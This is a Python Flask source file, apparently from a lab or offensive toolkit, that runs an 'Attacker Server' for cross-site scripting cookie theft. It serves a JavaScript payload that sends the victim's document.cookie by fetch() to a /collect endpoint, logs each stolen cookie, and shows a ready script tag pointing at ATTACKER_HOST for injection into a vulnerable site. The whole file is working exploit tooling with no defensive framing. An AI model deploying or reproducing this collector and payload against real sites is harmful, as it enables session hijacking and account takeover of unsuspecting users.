from flask import Flask, request, Response
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

@app.route("/steal.js")
def steal_js():
    """Serve malicious JS that exfiltrates cookies to /collect"""
    script = (
        "(function(){"  # start IIFE
        "fetch('http://'+location.hostname+':4000/collect?c='+encodeURIComponent(document.cookie));"
        "})();"
    )
    return Response(script, mimetype="application/javascript")

@app.route("/collect")
def collect():
    cookie = request.args.get("c")
    logging.info("[+] Stolen cookie: %s", cookie)
    return "OK"

@app.route("/")
def index():
    return (
        "<html><body><h1>Attacker Server</h1>"
        "<p>Use the following script tag in your XSS vector:</p>"
        "<code>&lt;script src=\"http://ATTACKER_HOST:4000/steal.js\"&gt;&lt;/script&gt;</code>"
        "</body></html>"
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4000) 